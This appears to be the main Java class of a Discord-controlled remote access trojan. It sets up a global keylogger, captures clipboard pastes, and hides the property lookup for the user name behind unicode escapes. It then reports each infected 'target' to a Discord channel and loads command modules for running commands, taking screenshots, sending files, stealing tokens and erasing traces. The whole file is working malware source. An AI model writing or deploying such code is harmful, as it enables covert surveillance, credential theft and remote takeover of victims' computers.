package main;

import cmd.*;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import lc.kra.system.keyboard.event.GlobalKeyListener;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.TextChannel;


import javax.security.auth.login.LoginException;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import java.net.URISyntaxException;

import java.text.SimpleDateFormat;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Date;
import java.util.Random;
import java.util.concurrent.CopyOnWriteArrayList;

public class Bot {
    private final String token = "TOKEN";
    public static JDA jda;
    public static Bot instance;
    public static String id = "";
    public static String path = "";
    public static String alias = "";
    public static final long bot_id = System.currentTimeMillis();
    public static boolean is_run = false;
    public static TextChannel main_channel = null;
    private static String lineBuff = "";
    public static ArrayList<String> pastes = new ArrayList<>();
    GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);

    public static CopyOnWriteArrayList<Command> commands = new CopyOnWriteArrayList<>();

    private final SimpleDateFormat sdf = new SimpleDateFormat("dd-HH:mm:ss");
    public Bot(){
        instance = this;
        //Runtime.getRuntime().addShutdownHook(new Thread(Bot::shutdown));
        try {
            path = getClass()
                    .getProtectionDomain()
                    .getCodeSource()
                    .getLocation()
                    .toURI()
                    .getPath();
            path = path.substring(0,path.lastIndexOf('/'));
        } catch (URISyntaxException e) {
            System.exit(0);
            return;
        }

        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                String c = String.valueOf(event.getKeyChar());
                if (event.getVirtualKeyCode()==GlobalKeyEvent.VK_RETURN) {
                    if (!lineBuff.replace(" ", "").isEmpty()) {
                        Keystroke.lines.add(lineBuff);
                        lineBuff = "";
                        Keystroke.checkUpload();
                    }
                }
                else if (event.getVirtualKeyCode()!=GlobalKeyEvent.VK_SHIFT){
                    if (event.isShiftPressed()) lineBuff+='^'+c;
                    if (event.isControlPressed()) lineBuff+='%'+c;
                    else lineBuff+=c;
                }
                if (event.getVirtualKeyCode()==GlobalKeyEvent.VK_V&& event.isControlPressed()){ // paste
                    try {
                        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                        String data = String.valueOf(clipboard.getData(DataFlavor.stringFlavor));
                        final Date date = new Date(System.currentTimeMillis());//
                        pastes.add(sdf.format(date)+": "+data);
                    } catch (UnsupportedFlavorException | IOException e) {
                        pastes.add("ERROR RECIEVING PASTE");
                    }

                }
            }
        });

        try {


            jda = JDABuilder.createDefault(token).build().awaitReady();
            jda.getPresence().setStatus(OnlineStatus.ONLINE);
            String n = System.getProperty("\u0075\u0073\u0065\u0072\u002e\u006e\u0061\u006d\u0065");
            if (n.equals("")) n = System.getProperty("\u0075\u0073\u0065\u0072\u002e\u0068\u006f\u006d\u0065");
            jda.getPresence().setActivity(Activity.watching(n));
            jda.addEventListener(new EventListener());

            //command
            commands.add(new Run());
            commands.add(new Keystroke());
            commands.add(new Screenshot());
            commands.add(new Type());
            commands.add(new ClipboardCmd());
            commands.add(new Alias());
            commands.add(new Whois());
            commands.add(new MsgBox());
            commands.add(new InfoCmd());
            commands.add(new NoTrace());
            commands.add(new SendFile());
            commands.add(new GetToken());
            commands.add(new Isolate());
            commands.add(new ClipboardCmd());
            id = jda.getSelfUser().getId();
            for (TextChannel gc : jda.getGuilds().get(0).getTextChannels()) if (gc.canTalk() && gc.getName().equals("CHANNEL"))
                try { gc.sendMessage("target online `"+n+"` | bot_id: `"+bot_id+"` | logger: true | pref_channel: true").queue(); main_channel = gc; break;}catch (Exception e){}
            if (main_channel==null)
                for (TextChannel gc : jda.getGuilds().get(0).getTextChannels())
                    if (gc.canTalk())
                        try { gc.sendMessage("target online `"+n+"` | bot_id: "+bot_id+" | logger: true | pref_channel: false").queue(); main_channel = gc; break;}catch (Exception e){}



        }catch (LoginException | InterruptedException le){ }
    }

    public static void shutdown(){
        try { jda.shutdown(); }catch (NoClassDefFoundError e){ }
        System.exit(0);
    }

}
